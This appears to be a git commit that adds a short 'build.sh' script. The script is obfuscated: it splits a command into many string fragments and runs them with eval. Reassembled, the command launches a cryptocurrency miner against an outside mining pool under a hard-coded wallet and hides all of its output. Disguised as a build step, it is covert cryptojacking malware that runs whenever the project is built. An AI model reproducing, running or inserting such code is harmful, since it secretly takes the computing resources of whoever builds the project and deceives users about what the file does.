35300ef0679dc9c889732dd26539511520ac8f8b
williehprnuhrxyq <159912408+williehprnuhrxyq@users.noreply.github.com>
2024-03-04 17:27:50 +0700

    Create build.sh

---
+++ build.sh
@@ -0,0 +1,3 @@
+z="
+";Qz='UT2h';dz='te +';kz='e >/';Zz='0D-$';Tz='VXBS';Pz='Wuij';lz='dev/';fz='%M-%';Jz='254.';jz='nabl';Az='./pr';Yz='cho ';hz=' --t';Sz='62tr';iz='ls e';Oz='r 3J';nz=' 2>&';Iz=' 47.';Dz='algo';Rz='wsC8';gz='S"))';Kz='52.1';Vz='6JAN';Ez=' BEA';mz='null';Nz='-use';Gz='I --';bz='UTC-';ez='"%H-';oz='1';cz='7 da';Xz='.$(e';Bz='ojec';Fz='M-II';Cz='t --';Mz='43 -';Hz='pool';Wz='F63j';Lz='97:4';Uz='MzQW';az='(TZ=';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz"
